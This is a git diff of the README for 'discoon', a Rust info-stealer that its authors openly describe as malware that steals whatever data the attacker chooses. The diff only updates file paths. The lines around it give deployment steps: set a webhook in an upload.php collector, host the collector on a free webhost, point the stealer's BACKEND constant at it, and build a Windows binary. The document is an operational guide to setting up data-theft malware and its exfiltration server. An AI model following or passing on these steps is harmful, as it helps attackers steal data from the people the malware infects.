@@ -26,9 +26,9 @@ This is a malware written in Rust that steals the information the attacker choos
 2. Install windows [toolchain](https://rust-lang.github.io/rustup/installation/windows.html)
 
 ### Setup
-1. Go to [upload.php](https://github.com/RadonCoding/discoon/blob/main/assets/upload.php#L3) and set the webhook
+1. Go to [upload.php](https://github.com/RadonCoding/discoon/blob/main/res/upload.php#L3) and set the webhook
 2. Get a webhost you can get a free one from [here](https://www.000webhost.com/)
-3. Upload the [upload.php](https://github.com/RadonCoding/discoon/blob/main/assets/upload.php) to your webhost
+3. Upload the [upload.php](https://github.com/RadonCoding/discoon/blob/main/res/upload.php) to your webhost
 4. Change the `BACKEND` in [constants.rs](https://github.com/RadonCoding/discoon/blob/main/src/constants.rs#L47) to your webhost
 5. Configure the options however you like
 6. Run `cargo build --release --target=x86_64-pc-windows-msvc`
